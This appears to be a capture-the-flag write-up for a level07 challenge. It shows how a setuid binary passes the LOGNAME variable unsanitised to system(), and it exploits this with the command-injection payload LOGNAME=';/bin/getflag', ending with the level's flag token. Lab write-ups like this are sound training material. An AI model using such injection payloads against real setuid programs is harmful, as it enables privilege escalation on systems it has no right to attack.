@@ -1,0 +1,86 @@
+From the level07 account, the goal was to execute getflag with the privileges of the flag07 account.
+
+The home directory contains a single interesting file:
+
+level07
+
+I checked its type and permissions:
+
+file level07
+ls -la level07
+
+Output:
+
+level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+
+The binary is owned by flag07 and has the SUID and SGID bits set, so when anyone runs it, it executes with the privileges of flag07.
+
+I then looked for readable strings inside the binary:
+
+strings level07
+
+Interesting strings found:
+
+LOGNAME
+/bin/echo %s
+getenv
+asprintf
+system
+setresgid
+setresuid
+
+These strings suggest that the program reads an environment variable named LOGNAME, formats a command string using /bin/echo, and then executes it with system().
+
+To confirm the exact behavior, I opened the binary in gdb:
+
+break main
+run
+
+I stepped through the code with ni (next instruction) until just before the call to system(). At that point I checked the value of eax, which holds the argument passed to system():
+
+x/s $eax
+
+Output:
+
+0x804b070: "/bin/echo level07 "
+
+This confirms that the program builds a command string by calling something equivalent to:
+
+asprintf(&buffer, "/bin/echo %s", getenv("LOGNAME"));
+
+Then it passes that string directly to system().
+
+Because the input from LOGNAME is injected into a shell command without any sanitization, it is vulnerable to command injection.
+
+I first tried a simple replacement:
+
+export LOGNAME='/bin/getflag'
+./level07
+
+Output:
+
+/bin/getflag
+
+This did not work because the program builds the command /bin/echo /bin/getflag, which is just a harmless echo.
+
+To exploit the vulnerability, I injected a shell command separator. The semicolon ; ends the echo command and starts a new one.
+
+Payload:
+
+export LOGNAME=';/bin/getflag'
+./level07
+
+Output:
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+The shell interpreted the full command as:
+
+/bin/echo ;/bin/getflag
+
+The echo prints an empty line, and then /bin/getflag runs with the privileges of flag07, revealing the token.
+
+Token obtained to access the next level:
+
+fiumuikeil55xe9cu4dood66h
